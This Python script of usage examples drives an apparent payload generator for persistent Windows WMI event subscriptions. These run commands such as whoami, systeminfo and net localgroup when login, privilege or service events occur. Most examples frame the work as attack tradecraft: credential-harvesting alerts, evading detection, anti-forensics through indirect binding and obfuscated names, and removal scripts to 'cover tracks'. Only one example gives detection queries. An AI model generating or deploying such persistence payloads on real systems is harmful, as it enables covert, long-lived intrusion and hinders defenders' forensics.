#!/usr/bin/env python3
"""
WMI Event Log Subscriber - Usage Examples

Demonstrates various scenarios for using the Event Log subscriber
for persistent command execution monitoring.
"""

from wmi_event_log_subscriber import (
    WMIEventLogSubscriber,
    EventLogSubscriptionConfig,
    EventLogSource,
    EventTriggerCondition,
    ConsumerType,
    BindingType,
    create_event_log_subscriber,
    generate_event_log_payload,
)


def example_1_failed_login_monitoring():
    """Example 1: Monitor failed login attempts and execute command"""
    print("\n" + "=" * 90)
    print("EXAMPLE 1: Failed Login Monitoring")
    print("=" * 90)
    print("""
    Scenario: Execute a command whenever an account fails to log in
    Use Case: Reconnaissance, credential harvesting alerts
    Event ID: 4625 (Security Log)
    """)

    config = EventLogSubscriptionConfig(
        event_log_source=EventLogSource.SECURITY,
        event_ids=[4625],
        trigger_conditions=[EventTriggerCondition.FAILED_LOGIN],
    )

    subscriber = create_event_log_subscriber(config)
    payload = subscriber.generate_event_log_subscription_vbs(
        "cmd.exe /c whoami >> C:\\Windows\\Temp\\logins.txt"
    )

    print("Generated VBS Payload:")
    print(payload)
    print("\nDescription:")
    print("- Monitors Security Event Log for failed login events (4625)")
    print("- Executes 'whoami' command and appends to file")
    print("- Persists across system reboot")
    print("- Creates WMI event filter, consumer, and binding")


def example_2_successful_login_tracking():
    """Example 2: Track successful logins"""
    print("\n" + "=" * 90)
    print("EXAMPLE 2: Successful Login Tracking")
    print("=" * 90)
    print("""
    Scenario: Monitor and log successful login events
    Use Case: Activity tracking, audit logging
    Event IDs: 4624, 4648 (Security Log)
    """)

    config = EventLogSubscriptionConfig(
        event_log_source=EventLogSource.SECURITY,
        event_ids=[4624, 4648],
        trigger_conditions=[EventTriggerCondition.SUCCESSFUL_LOGIN],
    )

    subscriber = create_event_log_subscriber(config)
    payload = subscriber.generate_event_log_subscription_vbs(
        'powershell.exe -Command "whoami | Out-File -Path C:\\\\Windows\\\\Temp\\\\login.txt -Append"'
    )

    print("Generated VBS Payload:")
    print(payload[:500] + "...")
    print("\nDescription:")
    print("- Monitors successful logins (4624, 4648)")
    print("- Executes PowerShell to log user information")
    print("- Appends to file for activity tracking")


def example_3_privilege_escalation():
    """Example 3: Detect and react to privilege escalation"""
    print("\n" + "=" * 90)
    print("EXAMPLE 3: Privilege Escalation Detection")
    print("=" * 90)
    print("""
    Scenario: Detect when users escalate privileges
    Use Case: Privilege escalation detection, incident response
    Event IDs: 4672, 4964 (Security Log)
    """)

    config = EventLogSubscriptionConfig(
        event_log_source=EventLogSource.SECURITY,
        event_ids=[4672, 4964],
        trigger_conditions=[EventTriggerCondition.PRIVILEGE_ESCALATION],
    )

    subscriber = create_event_log_subscriber(config)
    payload = subscriber.generate_event_log_subscription_vbs(
        "cmd.exe /c net localgroup Administrators >> C:\\Windows\\Temp\\admin_changes.txt"
    )

    print("Generated VBS Payload:")
    print(payload[:600] + "...")
    print("\nDescription:")
    print("- Monitors privilege escalation events (4672, 4964)")
    print("- Logs current administrators when escalation detected")
    print("- Helps track unauthorized privilege changes")


def example_4_service_monitoring():
    """Example 4: Monitor service startup/shutdown"""
    print("\n" + "=" * 90)
    print("EXAMPLE 4: Service Startup Monitoring")
    print("=" * 90)
    print("""
    Scenario: Execute command when specific service starts
    Use Case: Trigger actions on service availability
    Event ID: 7036 (System Log)
    """)

    config = EventLogSubscriptionConfig(
        event_log_source=EventLogSource.SYSTEM,
        event_ids=[7036],
        trigger_conditions=[EventTriggerCondition.SERVICE_STARTED],
    )

    subscriber = create_event_log_subscriber(config)
    payload = subscriber.generate_event_log_subscription_vbs(
        "cmd.exe /c ipconfig /all > C:\\Windows\\Temp\\config.txt"
    )

    print("Generated VBS Payload:")
    print(payload[:600] + "...")
    print("\nDescription:")
    print("- Monitors system log for service startup (7036)")
    print("- Executes command when service starts")
    print("- Useful for triggering actions on network availability")


def example_5_active_script_consumer():
    """Example 5: Use ActiveScript consumer for stealth"""
    print("\n" + "=" * 90)
    print("EXAMPLE 5: ActiveScript Consumer (Stealth)")
    print("=" * 90)
    print("""
    Scenario: Use ActiveScript consumer instead of CommandLine
    Use Case: Evade detection, reduce forensic artifacts
    Event ID: 4625 (Security Log)
    """)

    config = EventLogSubscriptionConfig(
        consumer_type=ConsumerType.ACTIVE_SCRIPT,
    )

    subscriber = create_event_log_subscriber(config)
    payload = subscriber.generate_active_script_consumer(
        "cmd.exe /c systeminfo >> C:\\Windows\\Temp\\info.txt"
    )

    print("Generated VBS Payload:")
    print(payload[:700] + "...")
    print("\nDescription:")
    print("- Uses ActiveScriptEventConsumer instead of CommandLineEventConsumer")
    print("- Executes VBScript code directly")
    print("- May evade detection of CommandLineEventConsumer usage")
    print("- More stealthy than traditional command line consumer")


def example_6_multi_event_monitoring():
    """Example 6: Monitor multiple events simultaneously"""
    print("\n" + "=" * 90)
    print("EXAMPLE 6: Multi-Event Monitoring")
    print("=" * 90)
    print("""
    Scenario: Monitor failed logins, successful logins, and privilege escalation
    Use Case: Comprehensive security monitoring
    Event IDs: 4625, 4624, 4672
    """)

    config = EventLogSubscriptionConfig(
        event_log_source=EventLogSource.SECURITY,
        event_ids=[4625, 4624, 4672],
        trigger_conditions=[
            EventTriggerCondition.FAILED_LOGIN,
            EventTriggerCondition.SUCCESSFUL_LOGIN,
            EventTriggerCondition.PRIVILEGE_ESCALATION,
        ],
    )

    subscriber = create_event_log_subscriber(config)
    payload = subscriber.generate_multi_condition_subscription(
        "powershell.exe -Command \"Get-Date | Out-File C:\\Windows\\Temp\\events.log -Append\""
    )

    print("Generated VBS Payload (first 800 chars):")
    print(payload[:800] + "...")
    print("\nDescription:")
    print("- Creates 3 separate event filters")
    print("- Each filter monitors different event ID")
    print("- All execute the same command")
    print("- Comprehensive monitoring with single command")


def example_7_indirect_binding():
    """Example 7: Anti-forensics with indirect binding"""
    print("\n" + "=" * 90)
    print("EXAMPLE 7: Indirect Binding (Anti-Forensics)")
    print("=" * 90)
    print("""
    Scenario: Use indirect binding to obfuscate execution chain
    Use Case: Anti-forensics, evade monitoring
    """)

    config = EventLogSubscriptionConfig(
        binding_type=BindingType.INDIRECT,
        indirect_binding=True,
    )

    subscriber = create_event_log_subscriber(config)
    payload = subscriber.generate_indirect_binding_subscription(
        "cmd.exe /c tasklist > C:\\Windows\\Temp\\processes.txt"
    )

    print("Generated VBS Payload (first 800 chars):")
    print(payload[:800] + "...")
    print("\nDescription:")
    print("- Uses indirect binding pattern")
    print("- Executes via ActiveScriptEventConsumer instead of CommandLine")
    print("- Obfuscates execution chain for anti-forensics")
    print("- More difficult to detect via endpoint protection")


def example_8_powershell_subscription():
    """Example 8: PowerShell-based subscription"""
    print("\n" + "=" * 90)
    print("EXAMPLE 8: PowerShell Event Log Subscription")
    print("=" * 90)
    print("""
    Scenario: Create subscription using PowerShell
    Use Case: PowerShell-native environments
    """)

    subscriber = create_event_log_subscriber()
    payload = subscriber.generate_powershell_event_log_subscription(
        "cmd.exe /c Get-Process > C:\\Windows\\Temp\\ps.txt"
    )

    print("Generated PowerShell Payload:")
    print(payload)
    print("\nDescription:")
    print("- Uses System.Management.ManagementClass")
    print("- Creates WMI objects programmatically")
    print("- Alternative to VBS for PowerShell environments")


def example_9_obfuscated_names():
    """Example 9: Obfuscated naming"""
    print("\n" + "=" * 90)
    print("EXAMPLE 9: Obfuscated Naming")
    print("=" * 90)
    print("""
    Scenario: Use obfuscated variable and object names
    Use Case: Hide intent, evade detection
    """)

    config = EventLogSubscriptionConfig(
        obfuscate_names=True,
        randomize_variables=True,
    )

    subscriber = create_event_log_subscriber(config)
    payload = subscriber.generate_event_log_subscription_vbs(
        "cmd.exe /c whoami"
    )

    print("Generated VBS Payload (with obfuscation):")
    # Show variable names
    import re
    var_names = re.findall(r'Dim\s+(\w+)', payload)
    print(f"Variable names: {var_names}")
    print("\nPayload snippet:")
    print(payload[:500] + "...")
    print("\nDescription:")
    print("- All variable names are obfuscated with random suffixes")
    print("- Filter and consumer names are randomized")
    print("- Makes manual analysis more difficult")


def example_10_cleanup():
    """Example 10: Removal and cleanup"""
    print("\n" + "=" * 90)
    print("EXAMPLE 10: Subscription Cleanup")
    print("=" * 90)
    print("""
    Scenario: Remove Event Log subscriptions
    Use Case: Cover tracks, cleanup
    """)

    subscriber = create_event_log_subscriber()
    removal_script = subscriber.generate_removal_script()

    print("Generated Removal Script:")
    print(removal_script)
    print("\nDescription:")
    print("- Removes all filter-consumer bindings")
    print("- Deletes event filters")
    print("- Deletes consumers")
    print("- Cleans up WMI subscription namespace")


def example_11_detection_queries():
    """Example 11: Detection and forensics"""
    print("\n" + "=" * 90)
    print("EXAMPLE 11: Detection Queries")
    print("=" * 90)
    print("""
    Scenario: Query for existing subscriptions
    Use Case: Forensic analysis, detection
    """)

    subscriber = create_event_log_subscriber()
    queries = subscriber.generate_detection_query()

    print("Detection Queries:")
    for query_name, query in queries.items():
        print(f"\n{query_name}:")
        print(f"  {query}")

    print("\nUsage:")
    print("  powershell.exe")
    print("  Get-WmiObject -Namespace root\\subscription -Class __EventFilter")
    print("  Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer")
    print("  Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding")


def example_12_comprehensive_payload():
    """Example 12: Comprehensive real-world scenario"""
    print("\n" + "=" * 90)
    print("EXAMPLE 12: Comprehensive Real-World Scenario")
    print("=" * 90)
    print("""
    Scenario: Create multiple subscriptions for comprehensive monitoring
    Use Case: Full system monitoring via event log triggers
    """)

    # Configuration for comprehensive monitoring
    scenarios = [
        {
            "name": "Failed Login Detection",
            "source": EventLogSource.SECURITY,
            "event_ids": [4625],
            "condition": EventTriggerCondition.FAILED_LOGIN,
            "command": "powershell.exe -Command \"Get-EventLog Security -InstanceId 4625 -Newest 1 | Out-File C:\\\\windows\\\\temp\\\\login.log -Append\"",
        },
        {
            "name": "Privilege Escalation Detection",
            "source": EventLogSource.SECURITY,
            "event_ids": [4672],
            "condition": EventTriggerCondition.PRIVILEGE_ESCALATION,
            "command": "cmd.exe /c net localgroup Administrators >> C:\\\\windows\\\\temp\\\\admin.log",
        },
        {
            "name": "Audit Policy Monitoring",
            "source": EventLogSource.SECURITY,
            "event_ids": [4719],
            "condition": EventTriggerCondition.AUDIT_POLICY_CHANGED,
            "command": "powershell.exe -Command \"auditpol /get /category:* | Out-File C:\\\\windows\\\\temp\\\\audit.log\"",
        },
    ]

    print("\nScenario Summary:")
    for scenario in scenarios:
        print(f"\n{scenario['name']}:")
        print(f"  Event Log: {scenario['source'].value}")
        print(f"  Event IDs: {scenario['event_ids']}")
        print(f"  Trigger: {scenario['condition'].value}")
        print(f"  Command: {scenario['command']}")

    print("\nEach scenario would generate a separate WMI subscription")
    print("All subscriptions persist across system reboot")
    print("All execute independently when triggered")


def example_13_high_level_api():
    """Example 13: Using high-level API"""
    print("\n" + "=" * 90)
    print("EXAMPLE 13: High-Level API Usage")
    print("=" * 90)
    print("""
    Scenario: Use simplified API for quick payload generation
    Use Case: Rapid deployment
    """)

    print("\nExample 1: VBS Payload")
    payload1 = generate_event_log_payload(
        "cmd.exe /c whoami",
        event_log_source="SECURITY",
        event_ids=[4625],
        payload_type="vbs"
    )
    print(f"Length: {len(payload1)} chars")
    print(payload1[:300] + "...")

    print("\n\nExample 2: PowerShell Payload")
    payload2 = generate_event_log_payload(
        "cmd.exe /c systeminfo",
        event_log_source="SYSTEM",
        payload_type="powershell"
    )
    print(f"Length: {len(payload2)} chars")
    print(payload2[:300] + "...")

    print("\n\nExample 3: Active Script Payload")
    payload3 = generate_event_log_payload(
        "cmd.exe /c tasklist",
        payload_type="active_script"
    )
    print(f"Length: {len(payload3)} chars")
    print(payload3[:300] + "...")


def run_all_examples():
    """Run all examples"""
    examples = [
        example_1_failed_login_monitoring,
        example_2_successful_login_tracking,
        example_3_privilege_escalation,
        example_4_service_monitoring,
        example_5_active_script_consumer,
        example_6_multi_event_monitoring,
        example_7_indirect_binding,
        example_8_powershell_subscription,
        example_9_obfuscated_names,
        example_10_cleanup,
        example_11_detection_queries,
        example_12_comprehensive_payload,
        example_13_high_level_api,
    ]

    for example_func in examples:
        try:
            example_func()
        except Exception as e:
            print(f"Error in {example_func.__name__}: {e}")


if __name__ == "__main__":
    print("=" * 90)
    print("WMI EVENT LOG SUBSCRIBER - USAGE EXAMPLES")
    print("=" * 90)
    run_all_examples()
    print("\n" + "=" * 90)
    print("End of Examples")
    print("=" * 90)
